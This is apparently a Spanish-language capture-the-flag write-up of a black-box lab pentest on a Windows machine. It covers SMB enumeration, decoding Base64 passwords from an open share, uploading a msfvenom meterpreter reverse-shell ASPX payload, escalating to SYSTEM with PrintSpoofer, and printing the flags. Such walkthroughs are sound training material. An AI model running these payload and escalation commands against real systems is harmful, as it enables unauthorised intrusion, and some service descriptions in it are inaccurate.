# 1) Introducción

Se le ha asignado a un cliente que desea realizar una prueba de penetración en un entorno que se lanzará a producción en siete días. 

**Alcance del trabajo**

El cliente solicita que un ingeniero realice una evaluación del entorno virtual proporcionado. El cliente ha solicitado que se proporcione información mínima sobre la evaluación, ya que desea que la evaluación se lleve a cabo sin la intervención de un actor malintencionado (prueba de penetración de caja negra). El cliente ha solicitado que se aseguren dos indicadores (sin proporcionar la ubicación) como prueba de explotación:

- Usuario.txt
- Raíz.txt  

Además, el cliente ha previsto las siguientes asignaciones de alcance:

- En esta actividad se permiten cualquier herramienta o técnica, sin embargo, le solicitamos que primero intente la explotación manual.  
- Localizar y anotar todas las vulnerabilidades encontradas
- Envía las banderas descubiertas al panel de control
- Solo la dirección IP asignada a su máquina está dentro del alcance
- Encuentre y reporte TODAS las vulnerabilidades (sí, hay más de una ruta a la raíz)

(Juego de rol desactivado)

Te animo a que abordes este desafío como una prueba de penetración real. Considera la posibilidad de redactar un informe que incluya un resumen ejecutivo, una evaluación de vulnerabilidades y explotación y sugerencias de solución, ya que esto te ayudará a prepararte para el examen de penetración profesional certificado de eLearnSecurity o para trabajar como evaluador de penetración en este campo.

Nota: nada en esta sala requiere Metasploit
# 2) Objetivo

Bien, pues los objetivos están claros, solo podemos actuar sobre la Ip que se nos asigna, no podemos usar metasploit, debemos dejar constancia de todas las vulnerabilidades encontradas y debemos aportar las flags que se encuentran dentro de user.txt y root.txt.

# 3) Reconocimiento y obtener acceso

Comenzamos con un escaneo de puertos usando Nmap, lo ejecutamos así:

```
nmap -sV -A -T4 10.10.1.159
```

![](IMG/Pasted%20image%2020250304110755.png)

Vemos que tenemos varios puertos abiertos, el 80 en el que tenemos un servidor web, el 135 donde tenemos un servicio de escritorio remoto, el 139, el 445  y el 3389 donde parece haber un servidor samba.

Lo primero que intentamos es acceder al servicio web, a ver si hay algo interesante.

![](IMG/Pasted%20image%2020250304111215.png)

Nada, solo la pagina de inicio de IIS.

Hago un listado de directorios con feroxbuster, pero tampoco encontramos nada relevante.

```
feroxbuster --url http://10.10.1.159/
```

![](IMG/Pasted%20image%2020250304120106.png)

Lo siguiente que hacemos es enumerar el servicio samba, a ver que información conseguimos, para ello usamos enum4linux:

```
enum4linux 10.10.1.159
```

![](IMG/Pasted%20image%2020250304111407.png)

Nada, no conseguimos información porque no logra identificarse con el servidor.

![](IMG/Pasted%20image%2020250304111529.png)

Intentaremos entonces enumerar los directorios/servicios compartidos usando -L en smbclient:

```
smbclient -L \\10.10.1.159
```

![](IMG/Pasted%20image%2020250304111723.png)

Parece que hay una unidad de disco compartida que no tiene $, llamada nt4wrksv, por lo que supongo que no está restringida, así que pruebo a conectarme por si pudiéramos acceder a su contenido.

```
smbclient \\\\10.10.1.159\\nt4wrksv
```

![](IMG/Pasted%20image%2020250304112027.png)

Hemos conseguido acceder sin problemas, listamos su contenido y encontramos un archivo llamado passwords.txt.

![](IMG/Pasted%20image%2020250304112134.png)

Lo descargamos a nuestra máquina atacante para poder ver su contenido.

```
get passwords.txt
exit
```

![](IMG/Pasted%20image%2020250304112242.png)

usando:

```
nano passwords.txt
```

vemos el contenido del mismo.

![](IMG/Pasted%20image%2020250304112331.png)

Vemos lo que parecen ser contraseñas de usuarios codificadas en lo que parece ser Base64.

![](IMG/Pasted%20image%2020250304112407.png)

Así que iremos a la página de [Cyberchef](https://gchq.github.io/CyberChef/) para tratar de decodificarlas, añadiremos los hashes al input, y como receta usaremos from Base64 y nos da como output dos nombres de usuario con sus contraseñas:

![](IMG/Pasted%20image%2020250304113011.png)
![](IMG/Pasted%20image%2020250304113152.png)

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

Ya tenemos las credenciales de dos usuarios. Ahora mismo no se donde podría usarlos, quizas sirvan para más adelante.

Trataré de ejecutar una shell reversa, usaré msfvenom para crear el payload y así no no usar metasploit, primero debemos crear el payload, ejecutamos este comando:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.16.0 LPORT=4444 -f aspx -o payload.aspx
```

![](IMG/Pasted%20image%2020250304134538.png)

Y ahora que ya tenemos nuestro exploit creado, debemos enviarlo a la maquina objetivo, así que volvemos a conectarnos al servicio samba y probamos si podemos subirlo. De nuevo ejecutamos:

```
smbclient \\\\10.10.1.159\\nt4wrksv
```

![](IMG/Pasted%20image%2020250304134925.png)

Nos da error de conexión, puede ser porque la máquina esté fallando, lleva mucho tiempo corriendo, ya que vamos haciendo la maquina a ratos. Voy a terminarla y abrir una nueva. Nos cambiará la IP, pero nos viene pasando en todas las máquinas que estamos haciendo, ya que una misma maquina las voy haciendo en varias sesiones conforme voy teniendo tiempo.

![](IMG/Pasted%20image%2020250304135211.png)

Ahora si, era por eso. Así que volvemos a crear el exploit:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.16.0 LPORT=4444 -f aspx -o payload.aspx
```

![](IMG/Pasted%20image%2020250304135306.png)

Y lo subimos a la máquina objetivo, conectamos primero por samba (con la nueva IP):

```
smbclient \\\\10.10.4.88\\nt4wrksv
```

![](IMG/Pasted%20image%2020250304192934.png)

Y enviamos el payload:

```
put payload.aspx
```

![](IMG/Pasted%20image%2020250304135531.png)

Ahora que ya tenemos el exploit en la máquina objetivo, antes de ejecutarlo, debemos poner un "listener" en nuestra máquina atacante para que escuche las conexiones, usaremos netcat para ello. de esta forma:

> [!NOTE]
> Podríamos hacer el listener con metasploit, pero como en el enunciado nos han comentado que no era necesario para hacer esta máquina, usaremos netcat.

```
sudo nc -lvnp 4444 
```

Con este comando estamos pidiendo que escuche todas las conexiones entrantes (-l), que use verbose para que vaya mostrando lo que hace (-v), que evite el DNS (-n) y le especificamos el puerto de escucha (-p) en nuestro caso el 4444 que es el que pusimos en nuestro exploit.

![](IMG/Pasted%20image%2020250304140553.png)

Y ahora, ejecutamos el payload accediendo a el a traves del navegador web.

![](IMG/Pasted%20image%2020250304194203.png)

He tratado de acceder con el navegador web, haciendo una petición curl, poniendo en la dirección el puerto... y no nos da una shell reversa en netcat, a veces se conecta, pero no inicia la shell. Así que probare con metasploit, aunque quería evitarlo como dije en la nota de antes, pero a ver si así funciona. Voy a reiniciar la maquina objetivo, y la atacante, probaré de nuevo con netcat y si vuelve a fallar, probaré con metasploit.

Nada, sigue sin funcionar, así que, volvemos a mandar el payload, pero a la nueva IP (ya que hemos reiniciado la máquina).

> [!NOTE]
> Si hacemos el payload que cree una shell meterpreter, debemos escucharlo (hacer el listener) en metasploit obligatoriamente, por eso no funcionaba con Netcat.

```
smbclient \\\\10.10.37.67\\nt4wrksv
put payload.aspx
```

![](IMG/Pasted%20image%2020250305015334.png)

Y ahora, para hacer el listener en metasploit, lo ejecutamos:

```
msfconsole
```

![](IMG/Pasted%20image%2020250305015518.png)

y una vez dentro ejecutamos lo siguiente:

```
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.8.16.0
set LPORT 4444
run
```

con esto, estaremos seleccionando el exploit que queremos usar, el payload que queremos enviar, la dirección IP con la que tiene que establecer conexión, es decir, con la de nuestra máquina atacante, y el puerto por el que debe hacer la conexión.

![](IMG/Pasted%20image%2020250305015620.png)

Ahora que ya lo tenemos a la escucha, volvemos a hacer la petición curl, o a visitarlo desde el navegador (con la petición curl he tenido problemas, así que mejor desde el navegador).


> [!NOTE]
> Al solicitar desde el navegador, se queda mucho tiempo pensando, he probado si realmente conectaba buscando passwords.txt y muestra el contenido, por lo que hay conexión, pero le cuesta ejecutar el exploit, hay que armarse de paciencia y recargar y recargar la pagina una y otra vez, esperando siempre hasta que de error, y en una de esas, se conecta. es importante la direccion: 10.10.37.67:49663/nt4wrksv/payload.aspx sobre todo el puerto.

Después de probar durante un rato, por fin se ha conectado.

![](IMG/Pasted%20image%2020250305020030.png)

Ahora, solo es cuestión de navegar por los directorios y buscar el archivo user.txt, lo hemos encontrado en C:\users\bob\desktop\users.txt lo abrimos y encontramos la primera flag.

```
cat user.txt
```

![](IMG/Pasted%20image%2020250305020401.png)

**user.txt: THM{fdk4ka34vk346ksxfr21tg789ktf45}**

# 4) Escalada de privilegios

Ya tenemos acceso, así que intentaremos escalar privilegios, mientras se ejecutaba el payload de antes, he estado probando con nmap para encontrar más vulnerabilidades de la máquina, he usado:

```
nmap -oA nmap-vuln -Pn -script vuln -p 80,135,139,445,3389 10.10.37.67
```

![](IMG/Pasted%20image%2020250305021019.png)

Y he visto que el servicio samba, tiene una vulnerabilidad con codigo CVE-2017-0143 (MS17-010), es decir, eternalblue.

![](IMG/Pasted%20image%2020250305021621.png)

Como no quiero usar metasploit más de lo necesario, después de buscar pistas sobre como explotarlo, he encontrado que usando un exploit llamado printspoofer64, se puede hacer una escalada de privilegios, así que probaré a usarlo.

Lo primero que haremos será descargarlo, podemos hacerlo desde [Aquí](https://github.com/k4sth4/PrintSpoofer/raw/main/PrintSpoofer.exe) , una vez descargado, lo enviamos a la maquina objetivo, usando samba como hicimos con el payload.

![](IMG/Pasted%20image%2020250305022226.png)

y ahora, abriremos una shell en meterpreter.

![](IMG/Pasted%20image%2020250305022313.png)

Se nos ha caducado la sesión por tardar tanto, entre descargar y demás, ya es la segunda vez que nos pasa, repetimos lo de antes del payload y volvemos a hacer otra sesión.

> [!NOTE]
> Se ha quedado el servidor Samba "pillado", tenemos que reiniciar la máquina, otra ip diferente... es lo que tiene esto, totalmente inestable, paciencia, otra vez a subir el payload.aspx, Printspoofer y demás...

Ahora si, abrimos la shell.

![](IMG/Pasted%20image%2020250305024409.png)

navegamos a la ruta donde tenemos PrintSpoofer, que es c:\inetpub\wwwroot\nt4wrksv

![](IMG/Pasted%20image%2020250305024559.png)

y ejecutamos printspoofer con este comando:

```
PrintSpoofer.exe -i -c powershell.exe
```

![](IMG/Pasted%20image%2020250305025008.png)

Y habremos escalado privilegios, podemos comprobarlo haciendo:

```
whoami
```

![](IMG/Pasted%20image%2020250305025032.png)

Ahora, solo nos queda navegar por los directorios en busca del archivo root.txt, el cual se encuentra en C:\users\administrator\desktop\root.txt , lo abrimos y encontraremos la segunda flag.

```
cat root.txt
```

![](IMG/Pasted%20image%2020250305025151.png)

**root.txt: THM{1fk5kf469devly1gl320zafgl345pv}**


> [!NOTE]
> Finalmente, no he encontrado utilidad para las credenciales que habíamos conseguido. No se si servirán para algo o será algo para despistar de la propia máquina.